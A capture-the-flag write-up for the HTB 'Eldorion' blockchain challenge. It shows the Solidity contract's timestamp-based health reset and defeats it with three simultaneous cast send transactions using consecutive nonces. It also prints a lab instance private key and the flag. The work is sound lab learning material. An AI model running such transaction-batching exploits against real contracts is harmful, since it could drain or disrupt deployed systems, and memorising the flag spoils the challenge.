# Cyber Apocalypse CTF 2025: Tales from Eldoria

## Elderion
> "Welcome to the realms of Eldoria, adventurer. You’ve found yourself trapped in this mysterious digital domain, and the only way to escape is by overcoming the trials laid before you. But your journey has barely begun, and already an overwhelming obstacle stands in your path. Before you can even reach the nearest city, seeking allies and information, you must face Eldorion, a colossal beast with terrifying regenerative powers. This creature, known for its ""eternal resilience"" guards the only passage forward. It's clear: you must defeat Eldorion to continue your quest."


- **Category**: Blockchain 
- **Difficulty**: Very Easy
- **Author**: Alexct549

## Writeup

That's my first very blockchain challenge so i won't be very precise sorry 🙏

To help me out i read this [article](https://medium.com/@mostafaabdellatif/your-first-blockchain-ctf-challenge-59b12d04ac11) hope it helps someone like it did with me

Okay so we got 2 files but this is the one that it's useful to us now 

```python
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Eldorion {
    uint256 public health = 300;
    uint256 public lastAttackTimestamp;
    uint256 private constant MAX_HEALTH = 300;
    
    event EldorionDefeated(address slayer);
    
    modifier eternalResilience() {
        if (block.timestamp > lastAttackTimestamp) {
            health = MAX_HEALTH;
            lastAttackTimestamp = block.timestamp;
        }
        _;
    }
    
    function attack(uint256 damage) external eternalResilience {
        require(damage <= 100, "Mortals cannot strike harder than 100");
        require(health >= damage, "Overkill is wasteful");
        health -= damage;
        
        if (health == 0) {
            emit EldorionDefeated(msg.sender);
        }
    }

    function isDefeated() external view returns (bool) {
        return health == 0;
    }
}
```

So from this we understand what the win conditions are, in this case we need to lower the health to 0

Also it gives us the attack functions but with some limitations (maximum 100 damage per attack)

The problem is that everytime the block timestamps advances (hence every attack) it refills his health to 300 😡

In this case the solution it's pretty intuitive, we need to send 3 attacks at the same time

We setup the servers and we get the relevant infromations

```bash
❯ nc 94.237.57.230 49577
1 - Get connection information
2 - Restart instance
3 - Get flag
Select action (enter number): 1
[*] No running node found. Launching new node...

Player Private Key : 0x3bc8a0323a47d50056d142060be6c8ba87a98c7d90860e068ae76b57573e4a5c
Player Address     : 0x678191Dbff2bEe9FC84aB468716b52f4f84fC9a8
Target contract    : 0xDc87A3E0713BC80066a284617e7f4b564af8dD88
Setup contract     : 0x6ef924c849d1f26e772a5B65845525B6069c4F9F
```

And then we craft our crazy payload using foundry but more specifically cast

```bash
NONCE=$(cast nonce 0x678191Dbff2bEe9FC84aB468716b52f4f84fC9a8 --rpc-url http://94.237.57.230:42840/)

cast send 0xDc87A3E0713BC80066a284617e7f4b564af8dD88 "attack(uint256)" 100 --from 0x678191Dbff2bEe9FC84aB468716b52f4f84fC9a8 --private-key 0x3bc8a0323a47d50056d142060be6c8ba87a98c7d90860e068ae76b57573e4a5c --rpc-url http://94.237.57.230:42840/ --nonce $NONCE &

cast send 0xDc87A3E0713BC80066a284617e7f4b564af8dD88 "attack(uint256)" 100 --from 0x678191Dbff2bEe9FC84aB468716b52f4f84fC9a8 --private-key 0x3bc8a0323a47d50056d142060be6c8ba87a98c7d90860e068ae76b57573e4a5c --rpc-url http://94.237.57.230:42840/ --nonce $((NONCE+1)) &

cast send 0xDc87A3E0713BC80066a284617e7f4b564af8dD88 "attack(uint256)" 100 --from 0x678191Dbff2bEe9FC84aB468716b52f4f84fC9a8 --private-key 0x3bc8a0323a47d50056d142060be6c8ba87a98c7d90860e068ae76b57573e4a5c --rpc-url http://94.237.57.230:42840/ --nonce $((NONCE+2)) &

wait
```

The nonce it's manually set so it doesn't give us a error

Let's see if it worked

```bash
❯ nc 94.237.57.230 49577
1 - Get connection information
2 - Restart instance
3 - Get flag
Select action (enter number): 3
HTB{w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n}
```
OH BABY A TRIPLE 💥💥💥

> HTB{w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n}